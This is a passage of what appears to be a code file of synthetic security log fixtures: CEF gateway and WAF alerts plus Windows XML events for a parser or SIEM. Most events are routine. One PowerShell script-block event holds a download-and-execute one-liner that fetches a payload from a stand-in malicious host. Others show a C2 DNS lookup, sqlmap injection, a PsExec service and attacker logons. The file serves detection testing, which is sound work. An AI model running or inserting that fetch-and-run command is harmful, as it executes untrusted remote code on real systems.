    'CEF:0|Acme Mail|Secure Email Gateway|5.1.0|3010|Malicious Attachment Blocked|High|rt=1736692520000 suser=bob@acme.local duser=carol@acme.local msg=Attachment+blocked+by+AV+engine fname=invoice.exe filePath=/quarantine/2025/01/12/ fileHash=44d88612fea8a8f36de82e1278abb02f act=quarantine',
    '<134>Jan 12 14:35:25 waf01 CEF:0|Acme Networks|Web Application Firewall|2.7.3|7002|SQL Injection Attempt Blocked|9|rt=1736692525000 src=192.0.2.44 spt=51234 dst=10.1.3.10 dpt=8443 requestMethod=POST request=https://app.acme.local/api/search requestClientApplication=sqlmap/1.7 act=blocked outcome=success',
  ],
  // --- Windows XML EventLog channels (see resolveWindowsChannel). Real per-channel
  // <Event> XML so each XmlWinEventLog:* channel gets its own event model instead
  // of the mislabeled Security/classic/JSON content the shared catalog files hold. ---
  windows_xml_system: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{555908d1-a6d7-4695-8e1e-26931d2012f4}' EventSourceName='Service Control Manager'/><EventID Qualifiers='16384'>7045</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>88214</EventRecordID><Correlation/><Execution ProcessID='696' ThreadID='4056'/><Channel>System</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='ServiceName'>PSEXESVC</Data><Data Name='ImagePath'>%SystemRoot%\\PSEXESVC.exe</Data><Data Name='ServiceType'>user mode service</Data><Data Name='StartType'>demand start</Data><Data Name='AccountName'>LocalSystem</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{555908d1-a6d7-4695-8e1e-26931d2012f4}' EventSourceName='Service Control Manager'/><EventID Qualifiers='16384'>7036</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>88215</EventRecordID><Correlation/><Execution ProcessID='696' ThreadID='1204'/><Channel>System</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='param1'>Windows Update</Data><Data Name='param2'>running</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{555908d1-a6d7-4695-8e1e-26931d2012f4}' EventSourceName='Service Control Manager'/><EventID Qualifiers='16384'>7040</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>88216</EventRecordID><Correlation/><Execution ProcessID='696' ThreadID='4056'/><Channel>System</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='param1'>Background Intelligent Transfer Service</Data><Data Name='param2'>demand start</Data><Data Name='param3'>auto start</Data><Data Name='param4'>BITS</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='User32' Guid='{b0aa8734-56f7-41cc-b2f4-de228e98b946}' EventSourceName='User32'/><EventID Qualifiers='32768'>1074</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:27:02.220000000Z'/><EventRecordID>88217</EventRecordID><Correlation/><Execution ProcessID='1160' ThreadID='5528'/><Channel>System</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data>C:\\Windows\\system32\\RuntimeBroker.exe (WKS-1042)</Data><Data>WKS-1042</Data><Data>No title for this reason could be found</Data><Data>0x500ff</Data><Data>power off</Data><Data></Data><Data>ACME\\jdoe</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Kernel-Power' Guid='{331c3b3a-2005-44c2-ac5e-77220c37d6b4}'/><EventID>41</EventID><Version>0</Version><Level>1</Level><Task>63</Task><Opcode>0</Opcode><Keywords>0x8000000000000002</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>88218</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='8'/><Channel>System</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='BugcheckCode'>0</Data><Data Name='BugcheckParameter1'>0x0</Data><Data Name='SleepInProgress'>0</Data><Data Name='PowerButtonTimestamp'>0</Data><Data Name='BootAppStatus'>0</Data></EventData></Event>`,
  ],
  windows_xml_application: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Application Error'/><EventID Qualifiers='0'>1000</EventID><Level>2</Level><Task>100</Task><Keywords>0x80000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>44012</EventRecordID><Channel>Application</Channel><Computer>WKS-1042.acme.local</Computer><Security/></System><EventData><Data>outlook.exe</Data><Data>16.0.17328.20124</Data><Data>KERNELBASE.dll</Data><Data>10.0.19041.4239</Data><Data>c0000005</Data><Data>0000000000034f29</Data><Data>2f18</Data><Data>01da9f8c3a1b2c3d</Data><Data>C:\\Program Files\\Microsoft Office\\root\\Office16\\outlook.exe</Data><Data>C:\\Windows\\System32\\KERNELBASE.dll</Data><Data>a1b2c3d4-e5f6-7890-abcd-ef1234567890</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='MsiInstaller'/><EventID Qualifiers='0'>11707</EventID><Level>4</Level><Task>0</Task><Keywords>0x80000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>44013</EventRecordID><Channel>Application</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data>Product: 7-Zip 23.01 (x64) -- Installation completed successfully.</Data><Data>(NULL)</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='.NET Runtime'/><EventID Qualifiers='0'>1026</EventID><Level>2</Level><Task>0</Task><Keywords>0x80000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>44014</EventRecordID><Channel>Application</Channel><Computer>WKS-1042.acme.local</Computer><Security/></System><EventData><Data>Application: PayrollApp.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.NullReferenceException</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='ESENT'/><EventID Qualifiers='0'>326</EventID><Level>4</Level><Task>1</Task><Keywords>0x80000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:27:02.220000000Z'/><EventRecordID>44015</EventRecordID><Channel>Application</Channel><Computer>WKS-1042.acme.local</Computer><Security/></System><EventData><Data>svchost (1234)</Data><Data>The database engine attached a database (1, C:\\Windows\\system32\\CatRoot2\\catdb).</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Windows Error Reporting'/><EventID Qualifiers='0'>1001</EventID><Level>4</Level><Task>0</Task><Keywords>0x80000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>44016</EventRecordID><Channel>Application</Channel><Computer>WKS-1042.acme.local</Computer><Security/></System><EventData><Data>Fault bucket 123456789, type 5\nEvent Name: APPCRASH\nResponse: Not available\nFaulting application name: outlook.exe</Data></EventData></Event>`,
  ],
  windows_xml_dns_client: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-DNS-Client' Guid='{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}'/><EventID>3006</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>1201</EventRecordID><Correlation/><Execution ProcessID='2412' ThreadID='3120'/><Channel>Microsoft-Windows-DNS-Client/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='QueryName'>www.microsoft.com</Data><Data Name='QueryType'>1</Data><Data Name='QueryOptions'>140737488355328</Data><Data Name='ServerList'>10.0.1.1;</Data><Data Name='IsNetworkQuery'>1</Data><Data Name='NetworkQueryIndex'>0</Data><Data Name='InterfaceIndex'>0</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-DNS-Client' Guid='{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}'/><EventID>3008</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.155000000Z'/><EventRecordID>1202</EventRecordID><Correlation/><Execution ProcessID='2412' ThreadID='3120'/><Channel>Microsoft-Windows-DNS-Client/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='QueryName'>www.microsoft.com</Data><Data Name='QueryType'>1</Data><Data Name='QueryOptions'>140737488355328</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>23.55.72.14;23.55.72.20;</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-DNS-Client' Guid='{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}'/><EventID>3008</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>1203</EventRecordID><Correlation/><Execution ProcessID='4088' ThreadID='2044'/><Channel>Microsoft-Windows-DNS-Client/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='QueryName'>malware-c2.example.net</Data><Data Name='QueryType'>28</Data><Data Name='QueryOptions'>140737488355328</Data><Data Name='QueryStatus'>9003</Data><Data Name='QueryResults'></Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-DNS-Client' Guid='{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}'/><EventID>3006</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>1204</EventRecordID><Correlation/><Execution ProcessID='6120' ThreadID='7020'/><Channel>Microsoft-Windows-DNS-Client/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='QueryName'>ctldl.windowsupdate.com</Data><Data Name='QueryType'>1</Data><Data Name='QueryOptions'>140737488355328</Data><Data Name='ServerList'>10.0.1.1;</Data><Data Name='IsNetworkQuery'>1</Data><Data Name='NetworkQueryIndex'>0</Data><Data Name='InterfaceIndex'>0</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-DNS-Client' Guid='{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}'/><EventID>3008</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>1205</EventRecordID><Correlation/><Execution ProcessID='6120' ThreadID='7020'/><Channel>Microsoft-Windows-DNS-Client/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='QueryName'>ctldl.windowsupdate.com</Data><Data Name='QueryType'>1</Data><Data Name='QueryOptions'>140737488355328</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>::ffff:8.241.11.126;</Data></EventData></Event>`,
  ],
  windows_xml_powershell: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>3</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>9021</EventRecordID><Correlation ActivityID='{b1c2d3e4-f5a6-7890-bcde-f01234567890}'/><Execution ProcessID='6412' ThreadID='7120'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')</Data><Data Name='ScriptBlockId'>{c3d4e5f6-a7b8-9012-cdef-012345678901}</Data><Data Name='Path'></Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>9022</EventRecordID><Correlation ActivityID='{b1c2d3e4-f5a6-7890-bcde-f01234567890}'/><Execution ProcessID='6412' ThreadID='7120'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='ContextInfo'>Severity = Informational\nHost Name = ConsoleHost\nUser = ACME\\jdoe\nCommand Name = Invoke-WebRequest</Data><Data Name='Payload'>CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest"</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>9023</EventRecordID><Correlation ActivityID='{d4e5f6a7-b8c9-0123-defa-123456789012}'/><Execution ProcessID='7220' ThreadID='4412'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Get-Process | Where-Object { $_.CPU -gt 100 } | Sort-Object CPU -Descending</Data><Data Name='ScriptBlockId'>{e5f6a7b8-c9d0-1234-efab-234567890123}</Data><Data Name='Path'>C:\\Scripts\\monitor.ps1</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4105</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>17</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2024-05-06T17:27:02.220000000Z'/><EventRecordID>9024</EventRecordID><Correlation ActivityID='{d4e5f6a7-b8c9-0123-defa-123456789012}'/><Execution ProcessID='7220' ThreadID='4412'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='ScriptBlockId'>{e5f6a7b8-c9d0-1234-efab-234567890123}</Data><Data Name='RunspaceId'>{f6a7b8c9-d0e1-2345-fabc-345678901234}</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>9025</EventRecordID><Correlation ActivityID='{a7b8c9d0-e1f2-3456-abcd-456789012345}'/><Execution ProcessID='3320' ThreadID='2244'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='ContextInfo'>Severity = Informational\nHost Name = Windows PowerShell ISE Host\nUser = ACME\\jdoe\nCommand Name = Get-ChildItem</Data><Data Name='Payload'>CommandInvocation(Get-ChildItem): "Get-ChildItem"</Data></EventData></Event>`,
  ],
  windows_xml_ntlm: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-NTLM' Guid='{ac550f9a-b9d0-4b1e-a3f9-eb43a4d6f1c5}'/><EventID>8004</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>512</EventRecordID><Correlation/><Execution ProcessID='620' ThreadID='712'/><Channel>Microsoft-Windows-NTLM/Operational</Channel><Computer>DC-01.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='DomainName'>ACME</Data><Data Name='UserName'>jdoe</Data><Data Name='WorkstationName'>WKS-1042</Data><Data Name='SChannelName'></Data><Data Name='ProcessName'></Data><Data Name='LogonType'>3</Data><Data Name='SChannelType'>0</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-NTLM' Guid='{ac550f9a-b9d0-4b1e-a3f9-eb43a4d6f1c5}'/><EventID>8001</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>513</EventRecordID><Correlation/><Execution ProcessID='980' ThreadID='1120'/><Channel>Microsoft-Windows-NTLM/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='TargetName'>cifs/fileserver.acme.local</Data><Data Name='UserName'>jdoe</Data><Data Name='DomainName'>ACME</Data><Data Name='WorkstationName'>WKS-1042</Data><Data Name='PID'>4</Data><Data Name='ProcessName'>System</Data><Data Name='LogonType'>3</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-NTLM' Guid='{ac550f9a-b9d0-4b1e-a3f9-eb43a4d6f1c5}'/><EventID>8002</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>514</EventRecordID><Correlation/><Execution ProcessID='620' ThreadID='712'/><Channel>Microsoft-Windows-NTLM/Operational</Channel><Computer>DC-01.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UserName'>svc_backup</Data><Data Name='DomainName'>ACME</Data><Data Name='WorkstationName'>SRV-BAK-03</Data><Data Name='SecureChannelName'>ACME</Data><Data Name='CalleeProcessName'>C:\\Windows\\System32\\lsass.exe</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-NTLM' Guid='{ac550f9a-b9d0-4b1e-a3f9-eb43a4d6f1c5}'/><EventID>8004</EventID><Version>0</Version><Level>2</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:27:02.220000000Z'/><EventRecordID>515</EventRecordID><Correlation/><Execution ProcessID='620' ThreadID='980'/><Channel>Microsoft-Windows-NTLM/Operational</Channel><Computer>DC-01.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='DomainName'>ACME</Data><Data Name='UserName'>administrator</Data><Data Name='WorkstationName'>KALI-ATTACK</Data><Data Name='SChannelName'></Data><Data Name='ProcessName'></Data><Data Name='LogonType'>3</Data><Data Name='SChannelType'>0</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-NTLM' Guid='{ac550f9a-b9d0-4b1e-a3f9-eb43a4d6f1c5}'/><EventID>8001</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>516</EventRecordID><Correlation/><Execution ProcessID='2412' ThreadID='3120'/><Channel>Microsoft-Windows-NTLM/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='TargetName'>http/intranet.acme.local</Data><Data Name='UserName'>jdoe</Data><Data Name='DomainName'>ACME</Data><Data Name='WorkstationName'>WKS-1042</Data><Data Name='PID'>4820</Data><Data Name='ProcessName'>C:\\Program Files\\Internet Explorer\\iexplore.exe</Data><Data Name='LogonType'>3</Data></EventData></Event>`,
  ],
  windows_xml_defender: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Windows Defender' Guid='{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}'/><EventID>1116</EventID><Version>0</Version><Level>3</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>3201</EventRecordID><Correlation/><Execution ProcessID='3208' ThreadID='4120'/><Channel>Microsoft-Windows-Windows Defender/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='Product Name'>Microsoft Defender Antivirus</Data><Data Name='Severity Name'>Severe</Data><Data Name='Category Name'>Trojan</Data><Data Name='Threat Name'>Trojan:Win32/Wacatac.B!ml</Data><Data Name='Path'>file:_C:\\Users\\jdoe\\Downloads\\invoice.exe</Data><Data Name='Detection User'>ACME\\jdoe</Data><Data Name='Action Name'>Quarantine</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Windows Defender' Guid='{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}'/><EventID>1117</EventID><Version>0</Version><Level>3</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:01.550000000Z'/><EventRecordID>3202</EventRecordID><Correlation/><Execution ProcessID='3208' ThreadID='4120'/><Channel>Microsoft-Windows-Windows Defender/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='Product Name'>Microsoft Defender Antivirus</Data><Data Name='Threat Name'>Trojan:Win32/Wacatac.B!ml</Data><Data Name='Action Name'>Quarantine</Data><Data Name='Action ID'>2</Data><Data Name='Status Code'>0</Data><Data Name='Path'>file:_C:\\Users\\jdoe\\Downloads\\invoice.exe</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Windows Defender' Guid='{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}'/><EventID>5001</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>3203</EventRecordID><Correlation/><Execution ProcessID='3208' ThreadID='2044'/><Channel>Microsoft-Windows-Windows Defender/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='Product Name'>Microsoft Defender Antivirus</Data><Data Name='Feature Name'>Real-Time Protection</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Windows Defender' Guid='{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}'/><EventID>1000</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>3204</EventRecordID><Correlation/><Execution ProcessID='3208' ThreadID='4120'/><Channel>Microsoft-Windows-Windows Defender/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='Product Name'>Microsoft Defender Antivirus</Data><Data Name='Scan ID'>{a1b2c3d4-e5f6-7890-abcd-ef1234567890}</Data><Data Name='Scan Type Index'>1</Data><Data Name='Scan Type Name'>Quick Scan</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Windows Defender' Guid='{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}'/><EventID>2000</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>3205</EventRecordID><Correlation/><Execution ProcessID='3208' ThreadID='4120'/><Channel>Microsoft-Windows-Windows Defender/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='Product Name'>Microsoft Defender Antivirus</Data><Data Name='Current Signature Version'>1.409.512.0</Data><Data Name='Previous Signature Version'>1.409.498.0</Data><Data Name='Update Type'>4</Data><Data Name='Signature Type'>AntiVirus</Data></EventData></Event>`,
  ],
  windows_xml_security: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>556677</EventRecordID><Correlation ActivityID='{b1c2d3e4-f5a6-7890-bcde-f01234567890}'/><Execution ProcessID='656' ThreadID='740'/><Channel>Security</Channel><Computer>DC-01.acme.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-18</Data><Data Name='SubjectUserName'>DC-01$</Data><Data Name='SubjectDomainName'>ACME</Data><Data Name='SubjectLogonId'>0x3e7</Data><Data Name='TargetUserSid'>S-1-5-21-1004336348-1177238915-682003330-1013</Data><Data Name='TargetUserName'>jdoe</Data><Data Name='TargetDomainName'>ACME</Data><Data Name='TargetLogonId'>0x1a2b3c</Data><Data Name='LogonType'>3</Data><Data Name='LogonProcessName'>NtLmSsp</Data><Data Name='AuthenticationPackageName'>NTLM</Data><Data Name='WorkstationName'>WKS-1042</Data><Data Name='LogonGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ProcessId'>0x0</Data><Data Name='ProcessName'>-</Data><Data Name='IpAddress'>10.0.1.50</Data><Data Name='IpPort'>51920</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>556678</EventRecordID><Correlation/><Execution ProcessID='656' ThreadID='740'/><Channel>Security</Channel><Computer>DC-01.acme.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-0-0</Data><Data Name='SubjectUserName'>-</Data><Data Name='SubjectDomainName'>-</Data><Data Name='SubjectLogonId'>0x0</Data><Data Name='TargetUserSid'>S-1-0-0</Data><Data Name='TargetUserName'>administrator</Data><Data Name='TargetDomainName'>ACME</Data><Data Name='Status'>0xc000006d</Data><Data Name='FailureReason'>%%2313</Data><Data Name='SubStatus'>0xc0000064</Data><Data Name='LogonType'>3</Data><Data Name='LogonProcessName'>NtLmSsp</Data><Data Name='AuthenticationPackageName'>NTLM</Data><Data Name='WorkstationName'>KALI-ATTACK</Data><Data Name='ProcessId'>0x0</Data><Data Name='ProcessName'>-</Data><Data Name='IpAddress'>203.0.113.66</Data><Data Name='IpPort'>49771</Data></EventData></Event>`,
